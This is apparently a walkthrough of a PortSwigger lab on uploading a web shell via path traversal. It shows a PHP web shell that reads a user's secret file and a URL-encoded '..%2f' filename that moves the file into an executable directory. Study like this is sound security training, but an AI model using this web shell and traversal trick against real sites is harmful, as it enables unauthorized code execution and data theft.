Link: [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
Difficulty: Practitioner

# Payload
This is the payload I will use to retrieve the secret from `carlos`
```
<?php
$filename = "/home/carlos/secret";

if (file_exists($filename)) {
    $content = file_get_contents($filename);
    echo $content;
} else {
    echo "The file does not exist.";
}
?>
```

# Action
When attempting to upload the payload via `POST my-account/avatar` I notice the header `Content-Disposition` which tells the browser whether to display a resource.
Therefore, if I upload the payload normally and then get it with `GET /files/avatars/payload.php` which displays the script instead of executing it.

Technically, by chaining with another vulnerability called `Path Traversal` which helps move the file closer to the executable environment so `payload.php` could be executed

First, in the `filename` of `Content-Disposition` the value must be `..%2fpayload.php`. To furhter explain, `%2f` is `/` in URL encoded form, by appending with `../` prefix to the file, I could move the payload to be inside `/files`
<img width="1538" height="722" alt="Screenshot_20261101_233031" src="https://github.com/user-attachments/assets/08310e78-391a-4c24-81e3-03a77562ea29" />

Why is the payload moved to `/files`? In Unix file system, when executing `../` which move back to the previous directory.

To execute the payload
<img width="1542" height="523" alt="Screenshot_20261101_233053" src="https://github.com/user-attachments/assets/c4093d2d-ac3f-43c3-9482-068fdf77ee63" />

Happy Hacking!@#$@!$
